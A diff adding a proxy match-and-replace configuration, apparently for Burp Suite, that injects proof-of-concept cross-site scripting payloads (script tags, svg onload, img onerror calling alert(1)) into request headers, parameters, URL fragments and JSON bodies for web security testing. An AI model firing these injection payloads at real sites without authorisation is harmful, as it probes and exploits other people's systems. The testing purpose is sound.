@@ -1,0 +1,70 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "XSS payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Referer: ",
+                "string_replace": "Referer: javascript:alert(1)//"
+            },
+            {
+                "comment": "XSS payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "User-Agent: ",
+                "string_replace": "User-Agent: \"><svg/onload=alert(1)>"
+            },
+            {
+                "comment": "XSS payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Cookie: ",
+                "string_replace": "Cookie: session=\"><script>alert(1)</script>"
+            },
+            {
+                "comment": "XSS payload in query parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*", 
+                "string_replace": "=<svg/onload=alert(1)>"
+            },
+            {
+                "comment": "XSS payload in URL fragments",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_uri",
+                "string_match": "#",
+                "string_replace": "#\"><script>alert(1)</script>"
+            },
+            {
+                "comment": "XSS payload in JSON body",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "\".*\":.*",
+                "string_replace": "\"xss_payload\":\"<img src=x onerror=alert(1)>\""
+            },
+            {
+                "comment": "XSS payload in POST parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=<script>alert(1)</script>"
+            },
+            {
+                "comment":"Easy replace XSS payload",
+                "enabled":true,
+                "is_simple_match":true,
+                "rule_type":"request_header",
+                "string_match":"xss_payload",
+                "string_replace":"\"><svg/onload=alert(1)>"
+            }
+        ]
+    }
+}
